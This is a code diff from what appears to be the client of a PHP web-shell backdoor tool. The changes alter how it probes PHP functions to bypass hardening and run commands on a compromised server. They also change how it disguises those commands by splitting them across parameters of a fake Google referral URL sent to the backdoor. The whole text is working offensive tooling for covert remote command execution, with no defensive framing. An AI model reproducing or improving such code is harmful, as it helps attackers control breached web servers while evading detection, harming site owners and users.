@@ -308,10 +308,8 @@ class host():
 
      
     if escape < 0:
-      print "+ Testing functions to bypass PHP hardening..."
       ran = range(0,9)
     else:
-      print "+ Testing function " + methods[escape] + " to bypass PHP hardening..."
       ran = [ escape ]
       
     first=-1
@@ -323,6 +321,8 @@ class host():
 	if(ret==self.pwd):
 	  if first == -1:
 	    first=i
+	    if escape != -2:
+	      break
 	  sum_ok.append(methods[i])
 	  
 	else:
@@ -350,7 +350,7 @@ class host():
     else:
       self.method = first
       if escape != -2:
-	print '+ Using method ' + str(first) + ' (' + methods[first] + ').' 
+	print '+ Using method ' + str(first) + ' [' + methods[first] + '] on ' + self.url 
     
     return first
 
@@ -434,8 +434,9 @@ class host():
       simple_path=''.join(parsed.path.split('.')[:-1])
       q=simple_path.replace('/',' ')
       
-    real_refurl = 'http://www.google.com/url?' + 'sa=' + self.pwd[:2] + '&source=web&ct=7' + '&url=' + urllib2.quote(parsed.geturl(),'') + '&q=' + q + '&usg=' + cmdstr[:len(cmdstr)/2] + '&sig2=' + cmdstr[(len(cmdstr)/2):] 
+    #real_refurl = 'http://www.google.com/url?' + 'sa=' + self.pwd[:2] + '&source=web&ct=7' + '&url=' + urllib2.quote(parsed.geturl(),'') + '&q=' + q + '&usg=' + cmdstr[:len(cmdstr)/2] + '&sig2=' + cmdstr[(len(cmdstr)/2):] 
     
+    real_refurl = 'http://www.google.com/url?' + 'sa=' + self.pwd[:2] + '&source=web&ct=7' + '&url=' + urllib2.quote(parsed.geturl(),'') + '&q=' + q + '&ei=' + cmdstr[:len(cmdstr)/3] +'&usg=' + cmdstr[len(cmdstr)/3:len(cmdstr)*2/3] + '&sig2=' + cmdstr[len(cmdstr)*2/3:] 
     
     return ''.join(real_refurl)
     
